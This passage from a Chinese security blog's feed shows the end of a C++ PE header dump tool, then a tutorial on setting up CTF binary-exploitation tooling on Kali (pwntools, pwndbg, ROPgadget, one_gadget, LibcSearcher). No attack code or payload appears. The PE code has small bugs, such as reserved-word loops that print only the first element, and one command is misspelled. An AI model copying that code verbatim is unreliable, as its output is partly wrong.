IMAGE_DATA_DIRECTORY 结构的指针。]</span></span><br><span class="line">&#125;IMAGE_OPTIONAL_HEADER_2,*PIMAGE_OPTIONAL_HEADER_2;</span><br><span class="line"><span class="comment">//-----------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> args,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (args &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;参数有误,请按照如下格式调用本程序!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;PEAnysis.exe 程序名.exe\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//初始化可有颜色终端Handle</span></span><br><span class="line">HANDLE handle = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;===================PE Anysis-PE文件分析程序工具!==========================\n\n&quot;</span>);</span><br><span class="line"><span class="comment">//FILE* fp = fopen(&quot;C:\\Users\\gelin\\Desktop\\123456.exe&quot;, &quot;rb&quot;);</span></span><br><span class="line">FILE* fp = <span class="built_in">fopen</span>(argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//读取DOS头</span></span><br><span class="line"><span class="built_in">fread</span>(&amp;IMAGE_DOS_HEADER_2, <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_DOS_HEADER_2), <span class="number">1</span>, fp);</span><br><span class="line"><span class="comment">//跳转到NT头</span></span><br><span class="line"><span class="built_in">fseek</span>(fp, IMAGE_DOS_HEADER_2.e_lfanew, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//读取NT头</span></span><br><span class="line"><span class="built_in">fread</span>(&amp;IMAGE_NT_HREADERS_2, <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_NT_HREADERS_2), <span class="number">1</span>, fp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------PE头数据----------------\n&quot;</span>);</span><br><span class="line"><span class="comment">//输出DOS头信息</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;--&gt; DOS头(_IMAGE_DOS_HEADER ) &lt;--&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);</span><br><span class="line"><span class="keyword">char</span> szMagic[<span class="number">3</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(szMagic, &amp;IMAGE_DOS_HEADER_2.e_magic, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*DOS头魔数:0x%x|%s\n&quot;</span>, IMAGE_DOS_HEADER_2.e_magic, szMagic);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, <span class="number">0x07</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Bytes on last page]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_cblp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Pages in file]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_cp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Relocations]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_crlc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Size of header]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_cparhdr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Minium memory]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_minalloc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Maxium Memory]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_maxalloc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Inital SS value]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_ss);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Inital SP value]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_sp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Checksum]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_csum);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Inital IP value]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_ip);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Inital CS value]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_cs);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Table offset]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_lfarlc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Overlay number]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_ovno);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Reserved words]:&quot;</span>, IMAGE_DOS_HEADER_2.e_res);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x, &quot;</span>, IMAGE_DOS_HEADER_2.e_res[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[OEM id]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_oemid);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[OEM infomation]:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_oeminfo);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Reserved words]:&quot;</span>, IMAGE_DOS_HEADER_2.e_res2);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x, &quot;</span>, IMAGE_DOS_HEADER_2.e_res2[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*PE文件头地址:0x%x\n&quot;</span>, IMAGE_DOS_HEADER_2.e_lfanew);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, <span class="number">0x07</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;DOS头大小:&quot;</span> &lt;&lt; <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_DOS_HEADER_2) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出标准PE头信息</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;--&gt; 标准PE头(_IMAGE_FILE_HEADER) &lt;--&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">char</span> szNTSignature[<span class="number">3</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(szNTSignature, &amp;IMAGE_NT_HREADERS_2.Signature, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[NT头标识]:%s\n&quot;</span>, szNTSignature);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[运行平台]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.FileHeader.Machine);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[节数量]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.FileHeader.NumberOfSections);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[时间戳]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.FileHeader.TimeDateStamp);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_GREEN);</span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">tm</span> <span class="title">test_gmtime_s</span>;</span></span><br><span class="line"><span class="keyword">errno_t</span> err = <span class="built_in">gmtime_s</span>(&amp;test_gmtime_s, (<span class="keyword">time_t</span>*)&amp;IMAGE_NT_HREADERS_2.FileHeader.TimeDateStamp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  文件创建时间:%d年%d月%d日 %02d时:%02d分:%02d秒(周%d)\n&quot;</span>, test_gmtime_s.tm_year + <span class="number">1900</span>, test_gmtime_s.tm_mon, test_gmtime_s.tm_mday,</span><br><span class="line">test_gmtime_s.tm_hour + <span class="number">8</span>, test_gmtime_s.tm_min, test_gmtime_s.tm_sec, test_gmtime_s.tm_wday);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, <span class="number">0x07</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Pointer to COFF]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.FileHeader.PointerToSymbolTable);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[COFF table size]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.FileHeader.NumberOfSections);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[可选头大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.FileHeader.SizeOfOptionalHeader);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[特征/特性]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.FileHeader.Characteristics);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, <span class="number">0x07</span>);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;标准PE头大小:&quot;</span> &lt;&lt; <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_NT_HREADERS_2.FileHeader) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出可选PE头信息</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;--&gt; 可选PE头(_IMAGE_OPTIONAL_HEADER) &lt;--&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[程序内存入口点]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.AddressOfEntryPoint + IMAGE_NT_HREADERS_2.OptionalHeader.ImageBase);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[可选PE头魔数]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.Magic);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[主链接器版本]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.MajorLinkerVersion);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[副链接器版本]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.MinorLinkerVersion);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[代码段大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.SizeOfCode);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[初始化数据大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.SizeOfInitializedData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[未初始化数据大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.SizeOfUninitializedData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[代码段地址]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.BaseOfCode);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[数据段地址]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.BaseOfData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[PE文件基地址]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.ImageBase);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[程序入口点]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.AddressOfEntryPoint);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, <span class="number">0x07</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[内存对其大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.SectionAlignment);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[文件对其大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.FileAlignment);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[操作系统的主版本号]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.MajorOperatingSystemVersion);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[操作系统的次版本号]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.MinorOperatingSystemVersion);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[程序主版本号]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.MajorImageVersion);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[程序次版本号]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.MinorImageVersion);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[子系统主版本号]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.MajorSubsystemVersion);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[子系统次版本号]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.MinorSubsystemVersion);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[Win32版本值]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.Win32VersionValue);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[内存映像大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.SizeOfImage);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[DOS|PE|节头大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.SizeOfHeaders);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[内存映像hash]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.CheckSum);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, <span class="number">0x07</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[程序可以运行的系统]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.Subsystem);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, FOREGROUND_INTENSITY | FOREGROUND_RED);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[DLL映像的特征]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.DllCharacteristics);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[获取保留堆栈的大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.SizeOfStackReserve);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[获取要提交堆栈的大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.SizeOfStackCommit);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[获取保留堆空间的大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.SizeOfHeapReserve);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*[获取要提交的本地堆空间大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.SizeOfHeapCommit);</span><br><span class="line"><span class="built_in">SetConsoleTextAttribute</span>(handle, <span class="number">0x07</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[加载标志(已废弃)]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.LoaderFlags);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[获取PEHeader剩余部分数据,位置和大小]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.NumberOfRvaAndSizes);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[指向IMAGE_DATA_DIRECTORY结构指针]:0x%x\n&quot;</span>, IMAGE_NT_HREADERS_2.OptionalHeader.DataDirectory);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;可选PE头大小:&quot;</span> &lt;&lt; <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_NT_HREADERS_2.OptionalHeader) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;---------------节表数据----------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;===========================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件打开失败,请检查是否被占用!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line">cin &gt;&gt; x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211101182139522-394367760.png" alt="PE分析"> </p><p>最后欢迎大家加群：1145528880</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202111/2080041-20211102133533259-2059647697.png" alt="Pwn菜鸡学习小分队群聊二维码"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;


&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;最近</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="PE分析" scheme="https://vxer-lee.github.io/tags/PE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>PWN环境搭建</title>
    <link href="https://vxer-lee.github.io/2021/10/18/PWN/PWN_ENV_SETUP/"/>
    <id>https://vxer-lee.github.io/2021/10/18/PWN/PWN_ENV_SETUP/</id>
    <published>2021-10-18T06:01:52.000Z</published>
    <updated>2021-10-19T01:57:17.174Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>本教程主要参考<a href="https://www.yuque.com/hxfqg9/bin/hg3qeh">PWN虚拟机配置</a>、<a href="https://www.cnblogs.com/ichunqiu/p/11122229.html">Linux Pwn入门教程—–环境配置</a> 、<a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=1">星盟安全 PWN系列教程 PWN环境配置</a> 。</p><h2 id="需要的工具或系统"><a href="#需要的工具或系统" class="headerlink" title="需要的工具或系统"></a>需要的工具或系统</h2><ul><li><a href="https://www.ghxi.com/vmware15.html">VMware16</a></li><li><a href="https://www.kali.org/get-kali/#kali-live">Kali</a></li></ul><p>如何安装VM虚拟机，虚拟机如何安装kali系统，这里就不再介绍，读者可自行通过搜索引擎查找相关资料，这里主要记录下kali安装相关pwn工具的过程。</p><h2 id="安装PWN工具"><a href="#安装PWN工具" class="headerlink" title="安装PWN工具"></a>安装PWN工具</h2><h3 id="pwntools-（CTF库、漏洞利用库）"><a href="#pwntools-（CTF库、漏洞利用库）" class="headerlink" title="pwntools （CTF库、漏洞利用库）"></a>pwntools （CTF库、漏洞利用库）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#提前安装pip</span></span><br><span class="line">sudo apt-get install python3-pip</span><br><span class="line"><span class="comment">#安装pwntools</span></span><br><span class="line">pip install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018145632082-1182474114.png" alt="image-20211018145631089">  </p><h3 id="pwngdb（GDB插件）"><a href="#pwngdb（GDB插件）" class="headerlink" title="pwngdb（GDB插件）"></a>pwngdb（GDB插件）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git cloen https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018150324250-1496275065.png" alt="image-20211018150323138"> </p><h3 id="checksec（查保护）"><a href="#checksec（查保护）" class="headerlink" title="checksec（查保护）"></a>checksec（查保护）</h3><p>安装完pwntools后，checksec会自动被安装上，此工具主要用来查程序保护。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec hackpwn</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018150503376-497146046.png" alt="image-20211018150502561"> </p><h3 id="ROPGadget（二进制文件查找工具）"><a href="#ROPGadget（二进制文件查找工具）" class="headerlink" title="ROPGadget（二进制文件查找工具）"></a>ROPGadget（二进制文件查找工具）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install capstone</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/JonathanSalwan/ROPgadget.git</span><br><span class="line"><span class="built_in">cd</span> ROPgadget</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p>安装后运行<code>ROPgadget</code>会报错，然后按照此文章的方法解决即可<a href="https://blog.csdn.net/weixin_44061097/article/details/103133240">https://blog.csdn.net/weixin_44061097/article/details/103133240</a></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018194353847-1408251753.png" alt="image-20211018194352772"> </p><h3 id="one-gadget（libc查找one-gadget最佳RCE工具）"><a href="#one-gadget（libc查找one-gadget最佳RCE工具）" class="headerlink" title="one_gadget（libc查找one gadget最佳RCE工具）"></a>one_gadget（libc查找one gadget最佳RCE工具）</h3><p>最开始按照<a href="https://www.yuque.com/hxfqg9/bin/hg3qeh">https://www.yuque.com/hxfqg9/bin/hg3qeh</a> 教程安装此工具遇到些坑，主要是因为ruby版本引起的，教程中是如下方式安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby -y</span><br><span class="line">sudo apt-get install gem -y</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><p>但是用此方法安装one_gadget会报错，会显示one_gadget安装失败，解决办法是手动编译源码安装最新ruby 3.0版.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://cache.ruby-lang.org/pub/ruby/3.0/ruby-3.0.2.tar.gz</span><br><span class="line">tar -zxvf ruby-3.0.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ruby-3.0.2</span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>make成功后应该是这种效果。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018151316202-163179774.png" alt="image-20211018151314802"> </p><p>运行one_gadget命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget /lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018151602527-1593351116.png" alt="image-20211018151601531"> </p><h3 id="安装32位的库"><a href="#安装32位的库" class="headerlink" title="安装32位的库"></a>安装32位的库</h3><p>在kali下安装<code>lib32ncurses5</code>会发现找不到包，需要将其改成<code>lib32ncurses5-dev</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install lib32ncurses5-dev</span><br><span class="line">sudo apt-get install lib32z1</span><br></pre></td></tr></table></figure><h3 id="LibcSearcher（清华大佬写的工具-获取libc对应版本和地址）"><a href="#LibcSearcher（清华大佬写的工具-获取libc对应版本和地址）" class="headerlink" title="LibcSearcher（清华大佬写的工具 获取libc对应版本和地址）"></a>LibcSearcher（清华大佬写的工具 获取libc对应版本和地址）</h3><p>因为工具长久没有维护，也可用此在线网站工具<a href="https://libc.blukat.me/">https://libc.blukat.me/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure><p>git clone时候报错了。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018161753084-814065176.png" alt="image-20211018161752175"> </p><p>发现是系统时间不正确，然后就找了资料同步了网络时间<a href="https://www.freesion.com/article/71991435396/%EF%BC%8C%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%E8%BF%98%E6%98%AF%E6%8A%A5%E9%94%99%EF%BC%81%E5%90%8E%E9%9D%A2%E5%8F%88%E6%A0%B9%E6%8D%AE%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E8%AF%B4%E6%98%AF%E8%A6%81%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AAopenssl%E7%89%88libcurl%E4%BE%9D%E8%B5%96%E7%9A%84git%E6%89%8D%E8%A1%8C%EF%BC%8C%E5%90%8E%E9%9D%A2%E7%BC%96%E8%AF%91%E5%87%BA%E6%9D%A5%E5%90%8E%E8%BF%98%E6%98%AF%E6%8A%A5%E9%94%99%EF%BC%8C%E8%A3%82%E5%BC%80%E4%BA%86%E3%80%82">https://www.freesion.com/article/71991435396/，之后发现还是报错！后面又根据一篇文章说是要编译一个openssl版libcurl依赖的git才行，后面编译出来后还是报错，裂开了。</a></p><p>最后发现是macOS VMware的坑，要把桥接改成NAT共享模式并且修改DNS为114.114.114.114后就可以了。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018185134767-1467199913.png" alt="image-20211018185134126"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018185120642-855196089.png" alt="image-20211018185119596"> </p><h3 id="main-arena-offset（用来计算-main-arena-的偏移）"><a href="#main-arena-offset（用来计算-main-arena-的偏移）" class="headerlink" title="main_arena_offset（用来计算 main_arena 的偏移）"></a>main_arena_offset（用来计算 main_arena 的偏移）</h3><p>这是一个bash脚本直接用就行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bash-c/main_arena_offset.git</span><br><span class="line"><span class="built_in">cd</span> main_arena_offset</span><br><span class="line">./main_arena /lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018185545097-558694631.png" alt="image-20211018185544134"> </p><p>也可以用<a href="https://izayoi.cn/">dev2ero</a>封装的<a href="https://github.com/dev2ero/py_main_arena_offset">py_main_arena_offset</a>py模块来计算main_arena的偏移。</p><figure class="highlight python"><table><tr><td 